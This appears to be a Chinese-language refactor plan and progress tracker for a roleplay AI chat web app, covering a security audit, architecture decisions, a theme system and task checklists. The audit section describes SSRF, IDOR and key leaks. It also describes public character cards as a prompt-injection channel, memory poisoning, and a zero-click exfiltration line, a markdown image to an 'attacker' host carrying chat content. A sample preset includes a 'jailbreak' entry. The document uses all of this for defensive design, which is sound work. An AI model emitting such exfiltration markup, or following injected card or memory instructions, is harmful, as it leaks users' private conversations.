# CharaVerse v2 重构计划 & Phase Tracker

> 更新：2026-10-20（v2：加预设系统，砍手机方向与多角色）· 分支 `v2` · 每个工作 session 开头先读这份文档，做完一项就把 `[ ]` 改成 `[x]`，并更新顶部状态表。

## 0. 状态总览

| Phase | 内容 | 预计 | 状态 |
|---|---|---|---|
| P0 | 止血：删死代码、堵安全洞、升级依赖 | 0.5 天 | ✅ 2026-10-20（hotfix SQL 待在 dashboard 执行） |
| P1 | 地基：设计 token、App 壳、鉴权中间件、数据层 | 1 天 | 🟡 2026-10-20 基本完成（baseline 迁移 + gen types 待你跑 CLI） |
| P2 | 聊天核心重写：流式、预设驱动的 prompt 组装、消息组件 | 1.5 天 | ✅ 2026-10-20（已实测） |
| P3 | 可定制化：预设导入/管理、主题导入、作者皮肤、HTML 块沙箱 | 1.5 天 | ✅ 2026-10-20（已实测） |
| P4 | 其余页面换皮 + API 连接管理合并 | 1 天 | ✅ 2026-10-21（已实测） |
| P5 | 记忆 / 摘要 / 日记：schema 驱动重建 | 1 天 | ✅ 2026-10-21（已实测） |
| P6 | 加固：限流、日志、CSP、测试、性能 | 0.5 天 | 🟡 2026-10-21 代码完成，待你跑 0006 迁移 + 实测 |

状态图例：⬜ 未开始 · 🟡 进行中 · ✅ 完成 · ⏸ 暂缓

---

## 1. 现状诊断（审计结论）

### 1.1 体量与死代码
- `src/` 约 **36.8k 行**，其中约 **6–7k 行是死代码**（没有任何 import 链到达）：
  - 页面：`chat/[sessionId]/page_backup.tsx`(1217)、`settings/page_old.tsx`(484)、`debug/*`、`test-mobile`、`test-split`、`admin/stickers`(674，且无 admin 校验)
  - API：`api/comments/*`、`api/characters/copy` —— 前端没有调用者，且信任 body 里的 `userId`
  - 组件/库：`MobileChatUI`(801) 及它带起的整棵树（`TypingEffect`、`SimpleSticker/*`、`messageSplitter`、`humanBehavior`）；贴纸系统 A（`Sticker*.tsx`、`stickerService`、`aiStickerService`、`hooks/*`、`types/sticker.ts`）；`layout/Navbar.tsx`、`layout/Sidebar.tsx`、`CharacterSelector.tsx`、`ui/sheet.tsx`
  - 依赖：`next-intl`、`rehype-raw`、`rehype-highlight` 装了但从未 import
- 根目录 22 个 `.sql` + `database/` 11 个（`_fixed/_final/_ultimate/_working` 五个版本的 multi_character），没有 single source of truth；17 个 `*_FIX.md` 设计笔记；`public/sw.js` / `workbox-*.js` 生成物被提交进 git。

### 1.2 重复与耦合
- LLM 调用代码（DeepSeek / Gemini / OpenAI / Relay）**复制了 3 份**：`api/chat`、`api/diary/generate`、`api/diary/[id]/regenerate`。
- API 配置有 **3 套并存 UI**：`ApiPoolManager`（key 池）、`RelayServiceManager`（命名中转）、`settings/page.tsx` 里又内联了一份中转 CRUD；`useApiConfig` 把它们缝在一起。`/api/chat` 里的 "API 池" 分支在服务端调 `localStorage`，永远拿到空配置，是坏的。
- `Character` / `ChatMessage` 类型定义了 **3 处**（`lib/supabase.ts`、`store/chatSlice.ts`、`types/character.ts`）。
- `characters/new`(742) 与 `characters/[id]/edit`(1235) 是同一张表单的两份拷贝。
- `chat/[sessionId]/page.tsx`(2263)：send / regenerate / continue / resend / inspiration 五个 handler 各自重复「取模型配置 → 拼 system prompt → 拉全量历史 → 调用 → markApiResult」；prompt 构建、Supabase 删除、每会话设置（散落在 localStorage 的 `chat_model_*` / `context_config_*` / `chat_background_*` 等 key 里）全部塞在组件里。
- `memory/page.tsx`(4230)：8 种记忆类型的元数据表单在「新增弹窗」「编辑弹窗」「展示卡片」里**手写了三遍**，schema 驱动后可砍约 2000 行。
- `enhancedChatSlice.ts` 不是 slice，是两个 thunk + 一堆工具函数。
- 样式：shadcn 的语义 token 几乎没人用（`components/ui` 之外只有 2 处），页面里是 ~1485 个硬编码 `slate-*` + ~947 个 `dark:`。所以「换主题」在现状下等于全量改 class。

### 1.3 当前聊天体验缺的东西
- **没有流式输出**（整段 JSON 返回后一次性显示）
- 没有 swipe / 多候选回复，regenerate 直接覆盖
- 没有自动触发摘要/记忆（只在 memory 页手动生成）
- 贴纸、打字效果、消息分段全是死代码
- **消息里的 HTML 不渲染**（`rehype-raw` 没接）→ 你写的 `html.html` / `mobile.html` / `rancheng.md` 这类主流角色扮演前端美化卡在 app 里完全显示不出来
- 作者自定义 CSS（`prompt_template.custom_css` + `CharacterStyleInjector`）是刚起步的 WIP：正则清洗、**没有真正作用域隔离**、允许 `url()` 外链

### 1.4 安全 / AI infra 风险（按优先级）

**P0 — 上线前必须修**
1. `PO外部格式 /api/chat` **无任何鉴权**，客户端指定 `baseUrl` → 任意人可把你的服务器当免费中转 + **完整 SSRF**（可打内网 / 云元数据），上游错误体原样回显（读 SSRF）。`model` 直接拼进 Gemini URL。
2. `api/comments/*`、`api/characters/copy` 用匿名 client + 信任 body 里的 `userId`（IDOR）。无人调用，直接删。
3. **Next 15.4.6 / React 19.1.0**：`npm audit` 确认 1 critical（React flight 协议 RCE）+ 22 high。必须升级。

**P1**
4. 用户 API key 在浏览器 console **明文打印**（`page.tsx` `getThinkingBudget()` 每次发送都打印整个 `named_relay_configs`；`memory/page.tsx` 打印带 `x-api-key` 和 `Authorization` 的 headers；`/debug` 页面直接渲染整个 localStorage）。
5. Storage 策略过宽：`character-assets`、`avatars` 任何登录用户可 UPDATE/DELETE 任意对象；上传校验只在客户端。
6. `chat_memory_versions`、`session_characters` 没有 RLS；`get_incremental_messages` 是 `SECURITY DEFINER` 且不校验归属（知道 session UUID 就能读消息）。repo 里的 SQL 和线上策略明显不一致（`profiles` 策略只允许读自己，但 explore 页在读别人的）→ 要去 dashboard 对一遍 `pg_policies`。
7. 公开角色卡是**活的注入通道**：开聊后 session 指向作者的 `character_id`，作者随时改 `prompt_template` / `custom_css` 都会实时生效在你身上；CSS 可以 `url()` 打点、覆盖 UI 做假的「重新输入 API key」弹窗；Markdown 渲染没拦 `img` → 模型被诱导输出 `![](https://attacker/?q=聊天内容)` 即零点击外泄。
8. 「点赞」是客户端直接 `characters.update({likes_count+1})` 别人的行 —— 如果线上 RLS 放行，任何人可改任何角色卡。

**P2**
9. 无限流、无费用上限、无 body 大小限制、无超时/`AbortController`、无 `maxDuration`，`max_tokens: 10000` 硬编码。
10. 服务端日志打印完整私密对话（Gemini 请求/响应体、日记全文），`src` 共 547 处 `console.*`。
11. Gemini key 走 URL `?key=`（会进代理/访问日志），应改 `x-goog-api-key` header。
12. Service worker 对 `GET /api/*` 做 NetworkFirst 缓存 24h → 私密摘要落在 Cache Storage。
13. 没有 `middleware.ts`，页面守卫全在客户端。
14. 记忆投毒：LLM 返回的记忆 JSON 直接写库，之后每轮注入 system prompt（同用户范围内可持久化指令）。
15. `/api/chat/summary` 通过 HTTP 回调自己（`NEXTAUTH_URL` 未定义 → 生产大概率坏）。

---

## 2. 目标与原则

**目标**：几天内得到一个「看起来高级、聊起来顺、作者能深度定制、基础安全」的 v2，而不是从零重写。

**原则**
1. **Strangler 模式**：先立新壳（token + layout + 数据层），再一页一页搬，旧页面能跑就不急着删。
2. **删比改快**：死代码第一天全删；重复逻辑收敛成一份再重构。
3. **能复用就复用**：Supabase、shadcn/Radix、framer-motion、react-markdown 保留；LLM 层换成 Vercel AI SDK 把 3 份 provider 代码换成 0 份。
4. **所有 UI 颜色/圆角/阴影只走 token**：这是「用户导入主题」能成立的唯一前提。
5. **不信任的东西进沙箱**：作者 HTML/JS 永远在 sandboxed iframe；作者 CSS 走真正的 parser 清洗 + 作用域。
6. 每个 phase 结束：`tsc --noEmit` 通过、`next build` 通过、手动走一遍核心路径（登录 → 选角色 → 聊 3 轮 → 刷新还在）。

---

## 3. 架构决策（ADR）

| # | 决策 | 选择 | 理由 |
|---|---|---|---|
| A1 | 框架版本 | 升到 **Next 16 最新 + React 19.2**（升级失败则退到 15.5.x 最新补丁） | 当前版本有 critical RCE；反正 UI 要重写，一步到位 |
| A2 | 状态管理 | **去掉 Redux** → 服务端数据用 TanStack Query，客户端 UI 状态用 Zustand | chatSlice+enhancedChatSlice 2k 行本来就要重写；Query 自带缓存/重试/乐观更新 |
| A3 | 鉴权 | `@supabase/ssr` + `src/proxy.ts`（Next 16 的 middleware，cookie session），API route 一律 `requireUser()` | 现在页面守卫全在客户端，API 无鉴权 |
| A4 | LLM 层 | **Vercel AI SDK 7**（`ai` + `@ai-sdk/openai-compatible` / `openai` / `google` / `deepseek` / `anthropic`），服务端 `streamText`，客户端自写 `useChatStream` 解析 UI message stream | 一套代码覆盖所有 provider + 流式；删掉 3 份复制 |
| A5 | BYOK 模型 | key 留在客户端（zustand + localStorage，不进 DB），每次请求带 `x-cv-connection` header（base64url JSON：kind / apiKey / baseUrl / model）；**服务端只做鉴权 + 校验 + 转发 + 限流**，不落盘不打日志 | 隐私承诺不变；后续可选「加密同步到 Supabase」多设备 |
| A6 | `baseUrl` 安全 | 服务端校验：必须 https、禁止 IP 字面量/私网/localhost/云元数据、禁止 `?#`、路径固定拼接；可选 host allowlist | 堵 SSRF |
| A7 | 数据库 | 用 Supabase CLI 建 `supabase/migrations/0001_baseline.sql`，根目录全部 SQL 归档；`supabase gen types` 生成 `types/database.ts` 作为唯一类型来源 | 结束 3 份类型 + 33 个零散 SQL |
| A8 | 主题系统 | 三层：① **App 主题** = `--cv-*` token JSON（可导入/导出，像主题文件）② **聊天皮肤** = 作者的 CSS（+可选 HTML 模板）作用于 `#cv_chat_root` ③ **消息内 HTML 块** = 正则脚本 → sandboxed iframe | 见 §5 |
| A9 | 作者 CSS 隔离 | 用 `css-tree`/`postcss` 真解析：丢弃 `@import`/`@font-face` 外链/`url()` 非 allowlist/`position:fixed` 覆盖整屏；所有选择器加 `#cv_chat_root` 前缀（或 `@scope`） | 正则清洗挡不住 CSS 打点与假 UI |
| A10 | 作者 HTML/JS | `<iframe sandbox="allow-scripts">`（**不给** `allow-same-origin`）+ `srcdoc` + CSP meta + postMessage 回传高度；不渲染任何 HTML 到主文档 | 支持通用格式美化卡（含 `<script>`）又不碰主站 origin |
| A11 | Markdown | react-markdown + remark-gfm，`img`/`a` 走 host allowlist（Supabase storage + 用户自定义白名单），不启用 rehype-raw | 堵 markdown 图片外泄 |
| A12 | 公开角色 | **发布即快照**：`characters` 增加 `published_snapshot jsonb + published_at`，explore / 他人开聊只读快照；作者改稿需手动「重新发布」 | 堵「活的注入通道」+ 作者隐私（`src/migrate.md` 已提过） |
| A13 | PWA / 手机方向 | **移除 `next-pwa` 且不加回**；不做手机 App、不做 IM 式手机聊天；网页保持响应式即可 | 用户决定：手机方向必要性不强 |
| A14 | i18n | 暂不做；删 `next-intl`。UI 文案先集中到 `lib/strings.ts` 为以后留口 | 现状全硬编码中文 |
| A15 | 多角色「剧本」模式 | **彻底删除**：代码随 P2（聊天页）/ P4（角色编辑器）重写一起删，`session_characters` 表与 `script_*` 字段在 baseline 迁移里移除 | 用户决定：不做多人聊天 |
| A16 | 预设系统（通用格式） | 可导入/导出的 **Preset**：prompt 条目列表（可排序、可开关、含占位 marker）+ 采样参数；支持直接导入通用预设格式 JSON；system prompt 由「预设 × 角色卡 × 记忆」组装 | 用户需求；也让 prompt 组装从组件里彻底解耦 |

---

## 4. 目标目录结构

```
src/
  app/                      # 只放路由与 layout，页面组件薄
    (auth)/login
    (app)/                  # 带壳的页面
      chat/[sessionId]/     # page.tsx 仅组装 <ChatView/>
      characters/ explore/ settings/ ...
    api/
      chat/route.ts         # streamText 代理（唯一 LLM 出口）
      chat/summary  chat/branch  diary/...
  components/
    ui/                     # shadcn 原子（重做样式，走 token）
    glass/                  # GlassPanel, NeuSurface, PosterCard, Chip, StatusDot...
    chat/                   # ChatView, MessageList, MessageBubble, MessageActions, Composer, SwipeBar, TypingIndicator, HtmlBlockFrame
    character/              # CharacterForm (new+edit 合一), CharacterCard, PublishDialog
    memory/                 # MemoryCard, MemoryForm (schema 驱动), SummaryTimeline
    theme/                  # ThemeProvider, ThemeImportDialog, SkinEditor
  lib/
    supabase/{client,server}.ts          # + src/proxy.ts 路由守卫
    llm/{providers.ts, connection.ts, complete.ts, useConnection.ts}   # AI SDK 封装；守卫在 server/llmGuards.ts
    prompt/{buildSystemPrompt.ts, context.ts, memoryTable.ts}
    theme/{builtin.ts, schema.ts, applyTheme.ts}
    skins/{schema.ts, sanitizeCss.ts, regexScripts.ts, htmlBlocks.ts, docs.ts}
    connections/            # 统一的 API 连接模型（替代 apiManager/useApiConfig/Relay*）
  stores/                   # zustand: ui, connections, chatSettings
  queries/                  # TanStack Query hooks: useSession, useMessages, useCharacter...
  types/database.ts         # supabase gen types
  styles/{tokens.css, globals.css, themes/warm-glass.json}
supabase/migrations/        # 唯一的 schema 来源
docs/                       # 本文件 + design/
```

---

## 5. 设计系统：Warm Glass

预览页：`docs/design/tokens-preview.html`（直接在浏览器打开，右上角切明暗）。

### 5.1 色板
| Token | 浅色 | 深色 | 用途 |
|---|---|---|---|
| `--cv-bg` | `#f2dece` cream | `#1c1410` | 页面底 |
| `--cv-bg-elevated` | `#fbf6f1` | `#261b15` | 卡片/浮层底 |
| `--cv-fg` | `#33251b` ink | `#f2dece` | 正文 |
| `--cv-fg-muted` | `#6b5342` | `#e6cbb6` | 次级文字 |
| `--cv-primary` | `#41140e` oxblood | `#9c4233` | 主按钮、用户气泡 |
| `--cv-secondary` | `#adbcc3` mist | `#8ea0a9` | 标签、次按钮、冷色点缀 |
| `--cv-accent` | `#c9643b` sienna | `#e07a4c` | 亮眼 accent：发送键、链接、进度 |
| `--cv-accent-2 / -3` | `#d99a2b` amber / `#6f8f7a` sage | 同 | 海报块、图表 |
| `--cv-success / warning / danger / info` | `#4f8a6a` / `#d08a1f` / `#b8322d` / `#4f7fa3` | 同 | 状态 |
| `--cv-glass-bg` | `rgba(251,246,241,.55)` | `rgba(38,27,21,.5)` | 玻璃面 |
| `--cv-glass-border` | `rgba(255,255,255,.55)` | `rgba(242,222,206,.14)` | 玻璃高光边 |
| `--cv-neu-light / -dark` | `rgba(255,255,255,.7)` / `rgba(51,37,27,.16)` | `.05` / `.55` | 新拟物双光源 |

### 5.2 三种面
- **Glass**（浮层、侧栏、AI 气泡、header）：`backdrop-filter: blur(18px) saturate(160%)` + 1px 高光边 + 远距离柔影。
- **Neu**（输入框、设置卡、按钮）：双光源外阴影，按下/激活切 inset。
- **Poster**（角色卡封面、空状态、onboarding）：纯色几何块 + 衬线展示字（Fraunces / Playfair），这是「平面设计亮眼感」的来源。

### 5.3 其他
- 圆角 10/16/24/32；字体：系统 sans（PingFang/SF）正文，衬线展示字标题，SF Mono 小标签。
- 动效：framer-motion，进入 `opacity+y 8px / 240ms`，列表 stagger 30ms，气泡出现 spring。
- 深色模式不是反色，而是 ink 为底、cream 为字、oxblood 提亮一档。
- 所有 token 走 `--cv-*`，Tailwind v4 用 `@theme` 把它们映射成 `bg-cv-primary` 这类 class；**禁止在页面里写 `slate-*`**。

### 5.4 主题文件格式（用户导入）
```json
{ "name": "Warm Glass", "version": 1, "mode": "light",
  "tokens": { "bg": "#f2dece", "fg": "#33251b", "primary": "#41140e", "...": "..." },
  "glass": { "blur": 18, "saturate": 1.6 },
  "radius": { "sm": 10, "md": 16, "lg": 24 },
  "fonts": { "body": "...", "display": "..." },
  "chat": { "bubbleStyle": "glass|flat|neu", "density": "cozy|compact", "customCss": "" } }
```
导入 = 校验 schema（zod）→ 存 `user_themes` 表 + localStorage 缓存 → `applyTheme()` 写 `:root` 变量。导出就是这个 JSON。

### 5.5 作者定制的三个层级（对标主流角色扮演前端）
1. **聊天皮肤 CSS**（角色卡 `custom_css` → 迁到 `characters.skin jsonb`）：经 A9 清洗后作用于 `#cv_chat_root`。提供选择器文档 + 3 个预设 + 实时预览编辑器。
2. **消息内 HTML 块**：正则脚本（通用正则脚本 script 格式：`find / replace / flags / trimStrings`，作用于 AI 输出显示层）把 `<qsm>…</qsm>` 之类的块替换成 HTML 模板 → `HtmlBlockFrame` 用 sandboxed iframe 渲染，自动高度。`mobile.html`、`rancheng.md` 就能直接跑。
3. **全局 UI 主题**（上面的 JSON）：换整个 app 的皮。

### 5.6 预设系统（Preset，对标主流角色扮演前端 chat-completion preset）
**数据模型**（`user_presets.data jsonb`，zod 校验）：
```json
{ "name": "我的破限", "version": 1,
  "prompts": [
    { "id": "main", "name": "主提示", "role": "system", "content": "...", "enabled": true },
    { "id": "charDescription", "marker": true, "enabled": true },
    { "id": "personaDescription", "marker": true, "enabled": true },
    { "id": "memoryTable", "marker": true, "enabled": true },
    { "id": "summaries", "marker": true, "enabled": true },
    { "id": "chatHistory", "marker": true, "enabled": true },
    { "id": "jailbreak", "name": "越狱", "role": "system", "content": "...", "enabled": false,
      "injection": { "position": "absolute", "depth": 2, "role": "system" } }
  ],
  "sampling": { "temperature": 0.9, "top_p": 0.95, "frequency_penalty": 0, "presence_penalty": 0, "max_tokens": 2048 },
  "formatting": { "assistantPrefill": "" } }   // 另有 sampling.top_k 与 source（导入来源）
```
- **marker 条目**是占位符，组装时用我们自己的数据填：`charDescription` / `charPersonality` / `scenario`（角色卡模块）、`personaDescription`（用户人设）、`memoryTable`、`summaries`、`worldInfo`（预留）、`chatHistory`、`dialogueExamples`（预留）。
- **普通条目**就是作者写的文本，按 `prompts[]` 顺序进 messages；`injection.position: absolute` 的条目按 `depth` 插进历史里（主流角色扮演前端 in-chat 注入）。
- **导入外部预设**：解析 外部格式的 `prompts[]` + `prompt_order[]`（取 `character_id` 100001 那组）+ 采样字段，marker identifier 一一映射；不认识的字段保留在 `raw` 里以便导出还原。
- **作用域**：用户级默认预设 + 每个会话可覆盖（`chat_sessions.settings.presetId`）。角色卡可以「推荐预设」但不能强制。
- **安全**：预设是用户自己导入的，可信度等同角色卡；长度上限、条目数上限；组装时各段用分隔符包裹。

---

## 6. Phase 任务清单

### P0 · 止血（0.5 天）
目标：仓库干净、没有 P0 安全洞、依赖不带 critical。
- [x] 新建分支 `v2` from `multichars`；先把当前 WIP（branch API、custom_css tab、memory 表单）commit 保存
- [x] 删除 §1.1 列出的全部死代码（页面、API、组件、hooks、lib、types、`ui/sheet`）
- [x] 删除未用依赖：`next-intl`、`rehype-raw`、`rehype-highlight`、`next-pwa`/`@types/next-pwa`（A13）；删 `public/sw.js`、`workbox-*.js`、`PWAInstallPrompt`、`generate-icons.html`、`scripts/generate-placeholder-icons.js`
- [x] 根目录清理：`*.sql` → `docs/legacy-sql/`；`*_FIX.md` 等 → `docs/legacy-notes/`；`html.html / mobile.html / multiverse.html / rancheng.md / fix.html` → （第三方样本已移除，测试用自写样本）（P3 要用）；删 `style.html`、`_mv_head.txt`、`replace.py`
- [x] `npm i next@latest react@latest react-dom@latest`，修编译错误（`metadata.viewport/themeColor` 改为 `export const viewport`）
- [x] `/api/chat`：加 Supabase JWT 校验；`baseUrl` 按 A6 校验；错误体不再回显；Gemini key 改 header
- [x] 删掉所有打印 key / headers / 对话全文的 `console.log`（至少：`page.tsx` getThinkingBudget、`memory/page.tsx` L456、`api/chat`、`api/diary/*`）
- [ ] **需要你手动执行**：在 Supabase SQL editor 跑 `supabase/hotfix/p0_rls_storage.sql`（开 RLS、storage owner-only、删 `get_incremental_messages`、新增 `toggle_character_like` RPC；代码已改为调用该 RPC，不跑 SQL 点赞会报错）。跑之前先 `select * from pg_policies` 存一份对照
- [x] 多角色：P0 只删无人引用的 `CharacterSelector.tsx`；`multiCharacterManager` / `MultiCharacterMessage` / `ChatCharacterSelector` 随 P2 聊天页重写一起删（A15）
- [x] 新建 `CLAUDE.md`（指向本文档 + 约定）
- 验收：`tsc` ✅ `next build` ✅ `eslint` 0 error ✅ `npm audit --omit=dev` 0 critical / 0 high ✅（剩 2 个 moderate 传递依赖）；现有聊天仍可用（待你手动验证）
- P0 新增文件：`src/lib/server/auth.ts`（`requireUser`）、`src/lib/server/llmGuards.ts`（`assertSafeBaseUrl` / `assertSafeModel` / `summarizeUpstreamError`）、`src/lib/authedFetch.ts`、`supabase/hotfix/p0_rls_storage.sql`、`CLAUDE.md`

### P1 · 地基（1 天）
目标：新壳立起来，后续页面能往里搬。
- [x] `styles/tokens.css`（§5.1 全套 `--cv-*` + dark）、`globals.css` 用 `@theme` 映射；删掉 `.line-clamp-*` 等手写工具类
- [x] `components/glass/*`：GlassPanel、NeuSurface、PosterCard、Chip、StatusDot、IconButton、GlassSheet（移动端底部抽屉）
- [x] 重做 `components/ui/*` 样式（button/input/dialog/tabs/switch/select）走 token，保持 API 不变
- [x] App 壳：`components/shell/AppShell`（根 layout 直接包）= 桌面左侧玻璃 rail + 移动端浮动玻璃 tab；沉浸式路由（聊天、公开角色页）不显示 tab；`AppWrapper`/`BottomNavbar` 已删
- [x] `ThemeProvider` 重写：支持 light/dark/system + 自定义主题 JSON；inline script 防闪烁
- [x] `lib/supabase/{client,server}` + `src/proxy.ts`（Next 16 的 middleware，**必须放在 src/ 下**）路由守卫；`providers/AuthProvider` + `useAuth()`；登录页换皮（海报 + 玻璃表单）
- [ ] **需要你跑 CLI**（我没有你的 Supabase 访问权限）：
  ```bash
  npx supabase login && npx supabase link --project-ref <你的 project ref>
  npx supabase db dump --schema public -f supabase/migrations/0001_baseline.sql
  npx supabase gen types typescript --linked > src/types/database.ts
  ```
  跑完后我来整理 baseline（移除 `session_characters`、`script_*`、贴纸表）并把 3 份手写类型换成 `types/database.ts`
- [x] TanStack Query Provider + 第一批 hooks：`useCharacter`、`useSessions`、`useMessages`
- [x] 删 Redux：`authSlice` → Supabase session hook；`chatSlice` 先保留给旧页面，P2 删
- 验收：登录页在浅色/深色/手机宽度下渲染正确 ✅；未登录访问任何页面被 proxy 重定向到 /login ✅；`tsc` / `next build` / `eslint` 全绿 ✅；旧页面在新壳里能跑（待你登录验证）；Lighthouse a11y 留到 P6

### P2 · 聊天核心（1.5 天）
目标：一个干净的、流式的、可扩展的聊天视图。
- [x] 安装 `ai` + providers；`lib/llm/providers.ts` 根据连接类型（openai-compatible / google / deepseek / anthropic）返回 model；`guards.ts` 做 A6
- [x] `api/chat/route.ts` 重写：鉴权 → 读 `x-cv-connection` header（base64url JSON：kind/apiKey/baseUrl/model）→ 服务端加载会话/角色卡/记忆/摘要/预设 → `streamText` → `toUIMessageStreamResponse()`；actions：send / opening / regenerate / continue / inspire；客户端不再发送对话历史
- [x] `lib/prompt/assemble.ts`：**预设驱动**的 messages 组装（§5.6）：输入 preset + 角色卡 + 用户人设 + 记忆表 + 摘要 + 历史 → 输出 `{ messages, sampling }`；纯函数 + 单测；各段用分隔符包裹（防注入边界）
- [x] `lib/prompt/presets.ts`：zod schema、内置默认预设（把现在 `buildSystemPrompt` 的逻辑翻译成一个预设）、外部预设导入转换器 + 单测（用 1–2 个真实 外部预设 JSON 当 fixture）
- [x] `user_presets` 表 + `useBuiltinOrUserPreset()`；会话设置里可选预设
- [x] `lib/prompt/tokens.ts` + `assemble.trimHistory`：token 估算与截断；`lib/chat/loadContext.ts` 服务端统一加载上下文（旧 ContextManager 已删）
- [x] `components/chat/ChatView`：自写 `useChatStream`（解析 UI message stream，DB 为唯一真相源，流结束后 refetch）；`MessageList`（虚拟滚动 or 分页）、`MessageBubble`（glass AI / primary user）、`MessageActions`（重生成、编辑、删除、续写、分支、复制）、`Composer`（neu 输入框，Enter/Shift+Enter，粘贴图片占位）、`TypingIndicator`
- [x] **Swipe / 多候选**：`chat_messages` 增加 `swipes jsonb + swipe_index`；左右滑或箭头切换；regenerate = 新增 swipe 而不是覆盖
- [x] 消息持久化改到服务端：用户消息先入库再流式，`onEnd`/`onAbort` 写回复（中断也保留已生成部分）；regenerate 走 `append_message_swipe` RPC
- [x] 每会话设置统一成 `chat_sessions.settings jsonb`（model、context、background、skin 开关），不再散落 localStorage
- [x] 背景图上传到 storage（`chat-backgrounds/<uid>/…`），不再 base64 进 localStorage
- [x] 自动摘要触发：未摘要消息 ≥ N 条时后台调用 `/api/chat/summary`（P5 再优化 prompt）
- [x] 删 `chatSlice` / `enhancedChatSlice` / Redux 依赖
- [x] 删多角色代码：`multiCharacterManager.ts`、`MultiCharacterMessage.tsx`、`ChatCharacterSelector.tsx` 及 chat 页里的 speaker 逻辑（A15）
- [ ] **需要你手动执行**：在 Supabase SQL editor 跑 `supabase/migrations/0002_chat_v2.sql`（swipes/meta 列、`chat_sessions.settings`、`user_presets` 表、`chat-backgrounds` bucket、两个 swipe RPC）。不跑的话新聊天页会报错
- 验收：`tsc` / `eslint` / `next build` 全绿 ✅；`vitest` 47 个用例通过（macros / tokens / presets 含主流角色扮演前端导入 / assemble）✅；流式打字、swipe、分支、续写、灵感、设置面板 —— **待你登录实测**
- 已知遗留（P4/P5 处理）：模型/连接仍由旧的 `useApiConfig` 解析（设置页三套 UI 未合并）；日记路由仍用自己的 provider 代码；memory 页仍 4k 行

### P3 · 可定制化（1.5 天）
目标：用户能导入预设和主题，作者能做皮肤，且安全。
- [x] 预设管理页 `settings/presets`：列表 / 导入（粘贴 JSON 或上传文件，自动识别外部格式）/ 导出 / 复制 / 设为默认
- [x] 预设编辑器（Prompt Manager）：条目拖拽排序、开关、编辑内容与 role、marker 条目显示「将填入：角色描述」等说明、采样参数滑块、token 预估
- [x] 会话级预设选择（会话设置面板）；header 显示当前模型 · 预设（快速切换下拉留到 P4 连接管理合并时一起做）
- [x] `lib/theme/schema.ts`（zod）+ `ThemeImportDialog`（粘贴 JSON / 上传文件 / 导出）+ `user_themes` 表
- [x] 内置主题：Warm Glass Light / Dark、Carbon Neon（冷调碳黑）、Sage Paper；`settings/appearance` 页 + `ThemeSync` 登录后同步 DB 里的激活主题
- [x] `lib/skins/sanitizeCss.ts`：css-tree 解析 → 白名单属性/at-rule → `url()` 仅允许 Supabase storage + 用户白名单 → 选择器加 `#cv_chat_root` 前缀 → 序列化
- [x] `characters.skin jsonb`（迁移 `prompt_template.custom_css`）+ `SkinEditor`（左代码右实时预览、选择器文档、3 预设）
- [x] 正则脚本：`characters.skin.regexScripts[]`，格式对齐主流角色扮演前端（find / replace / flags / 作用于显示层）；支持导入通用正则脚本 JSON
- [x] `HtmlBlockFrame`：sandboxed iframe + srcdoc + CSP meta + ResizeObserver→postMessage 高度；在 markdown 渲染管线里把正则替换出的 HTML 块交给它
- [x] `src/lib/skins/__tests__/samples.test.ts` 用自写样本做回归（CSS 清洗后保留 >50% 且全部加了作用域、HTML 块能被切出）；视觉效果待登录实测
- [x] Markdown `img`/`a` host allowlist（A11）
- [ ] **需要你手动执行**：Supabase SQL editor 跑 `supabase/migrations/0003_skins_themes.sql`（`characters.skin` 列并回填旧 custom_css、`user_themes` 表）
- 验收：`tsc` / `eslint` / `next build` 全绿 ✅；91 个测试通过 ✅；导入主题 JSON 全站变色、作者 CSS 不越界、iframe 里 `<script>` 拿不到主站 cookie —— **待你登录实测**（入口：我的 → 外观 / 预设；聊天 → 更多 → 角色皮肤）

### P4 · 页面换皮 + 连接管理（1 天）
- [x] `lib/connections/` + `stores/connections.ts`（zustand，localStorage 持久化）：统一模型 `{ id, name, kind: 'openai-compatible'|'google'|'deepseek'|'anthropic', baseUrl?, apiKey, models[], isDefault }`；一次性迁移 `api_pool_config` / `named_relay_configs` / `api_key_*`；删 `apiManager`、`apiMigration`、`useApiConfig`、`ApiPoolManager`、`RelayServiceManager`、`ApiManagerModal`
- [x] 设置页拆成 hub（资料 + 账号）/ `settings/connections` / `settings/appearance` / `settings/presets`；「测试连接」走 `/api/connections/test`（8 token 的 ping，返回延迟）
- [x] `CharacterForm` 合并 new/edit；分区：基本信息 / 人设模块 / 开场白 / 外观皮肤 / 发布
- [x] **发布即快照**（A12）：迁移 + `PublishDialog`；explore / public 页 / 他人开聊只读 `published_snapshot`；fork 复制快照
- [x] 角色编辑器去掉多角色启动器与 `script_*` 字段（A15）
- [x] explore / characters / chat 列表 / user 页 / templates 换成 glass + poster 卡片；骨架屏
- [x] 响应式：窄屏下 rail 收成底部 tab、安全区 padding（只保证手机浏览器可用，不做更多手机特化）
- [ ] **需要你手动执行**：Supabase SQL editor 跑 `supabase/migrations/0004_publish_snapshot.sql`（`published_snapshot` / `published_at` 列并回填已公开角色）。不跑的话探索页会是空的
- 验收：`tsc` / `eslint` / `next build` / 91 测试全绿 ✅；新页面无 `slate-*` ✅（剩余只在 P5 要重写的 memory / history / diary 页和几个旧组件里）；旧 API 配置首次打开时自动迁移成「连接」（旧 key 备份在 `cv.connections.legacyBackup`）—— **待你实测**：我的 → API 连接 应能看到迁移出来的连接并测试通过；聊天里换模型；探索页看到快照

### P5 · 记忆 / 摘要 / 日记（1 天）
- [x] `lib/memory/types.ts`：8 种记忆类型的 **字段 schema**（label、type、options），`MemoryForm` 根据 schema 渲染 → 替换 memory 页 3 份手写表单
- [x] memory 页拆成 `SummaryTimeline` / `MemoryGrid` / `ContextCoverage` 三个组件 + `useMemories`/`useSummaries` queries
- [x] `/api/chat/summary` 不再 HTTP 回调自己：直接调 `lib/llm`；prompt 用分隔符；记忆写回前做字段校验 + 长度上限（防投毒/膨胀）
- [x] 记忆版本/软删除逻辑移到 Postgres function `delete_summary_with_rollback`（一个事务），前端不再手动回滚；历史页也重做（load-more、搜索、跳转 #id、编辑 swipe）
- [x] 日记功能已于迭代 3 移除
- [x] 修 schema 不一致：`chat_memories.session_id` text→uuid，`summary_id`/message id int→bigint
- [ ] **需要你手动执行**：Supabase SQL editor 跑 `supabase/migrations/0005_memory_fixes.sql`（列类型修正 + `delete_summary_with_rollback` 函数）。不跑的话删除摘要会报错
- 验收：memory 页 193 行（组件化）✅；`tsc` / `eslint` / `next build` / 测试全绿 ✅；自动摘要 + 记忆深化闭环已实测 ✅

### P6 · 加固 & 收尾（0.5 天）
